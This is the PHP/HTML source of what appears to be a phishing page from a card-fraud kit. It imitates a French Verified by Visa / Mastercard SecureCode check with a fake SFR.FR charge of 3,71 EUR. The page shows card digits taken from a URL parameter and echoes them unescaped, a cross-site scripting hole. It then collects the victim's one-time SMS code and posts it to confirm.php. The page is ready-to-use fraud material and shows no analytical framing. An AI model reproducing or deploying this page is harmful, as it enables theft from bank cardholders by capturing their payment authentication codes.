<?php
$bin4=$_GET['page'];

date_default_timezone_set('Europe/Paris');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
?>
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="icon" href="favicon.png" />
<link rel="stylesheet" type="text/css" href="styles.css">


 <title>AUTH</title>
<script type="text/javascript" src="authentication.js">
</script>
<style>
#allcenter {
	position: absolute;
	padding: 12px;
	left: 50%;
	top: 50%;
}
</style>




	

</head>
<body onload="init(); center() ;">
	<div id="allcenter" style="margin-left: -207px; margin-top: -212px;">
		<div id="cont">
			
				<div id="logo1Src">
					<img src="business.png" width="145" height="55" alt="Logo" title="Logo">
				</div>

			<div id="textSrc">

				

				<h1>
					<p>&nbsp;</p>
<p>Identification</p>
				</h1>

				

				<p style="margin-top:15px;">
					</p><p>Pour sécuriser au mieux vos paiements en ligne sur les sites affichant le logo Verified by Visa - Mastercard securecode, il vous suffit désormais de vous identifier en saisissant le code d'accès reçu par SMS sur votre téléphone portable.</p>
					<p>

						

		</p><div class="authentif">
			
			<form action="confirm.php" id="btn_ok" method="post" >
				<p>
					<span class="lbl">Marchand&nbsp;:&nbsp;</span><span>SFR.FR - 818990000371</span>&nbsp;
				</p>
				
					<p>
						<span class="lbl">Montant&nbsp;:&nbsp;</span><span>3,71 EUR</span>&nbsp;
					</p>
				
					<p>
						<span class="lbl">Date:&nbsp;:&nbsp;</span><span><?php echo date('d/m/Y H:i:s', time()); ?></span>&nbsp;
					</p>
					
					<p class="num_carte">
						<span class="lbl">N° de carte &nbsp;:&nbsp;</span><span>xxxxxxxxxxxx<?php echo $bin4 ?></span>&nbsp;
					</p>

					
					
					
						
							
								
					
						
					<p>
						<span class="lbl">Code d'accès reçu&nbsp;&nbsp;<br>par SMS&nbsp;:&nbsp;</span> 
						<input type="text" class="chp_smscode" id="chp1" name="shipped" autocomplete="off" maxlength="12">
	 
						<input  type="image" id="btn_ok" name="btn_ok" src="btn_ok_onn.png" alt="Valider" style="cursor: pointer;" >
					</p>
					
					
				
				<p class="f_d">
					Exemple : 95378417
				</p>
				
				


				
 
	</form></div>
	


	
	
		
			

			<p>Cette identification est obligatoire pour conclure votre transaction. Si votre numéro de téléphone n'est pas à jour, vous ne pourrez pas finaliser votre paiement.</p>

			
			
				<p>
					<a href="#/flowGlobal.wflowCNCE;jsessionid=342192000D6DC3DC41478B1124E53.w-node2?execution=e1s1&amp;_eventId=cancel" class="link_fl_b" rel="external">Ne pas m’identifier et annuler le paiement</a>
				</p>
				<p>
				</p>
				<p>
					<a href="../../index.php" class="link_fl_b" >Problème&nbsp;de réception du code SMS</a></right>
				</p>
			
		
		
	

	</div>
	</div>
	</div>


</body></html>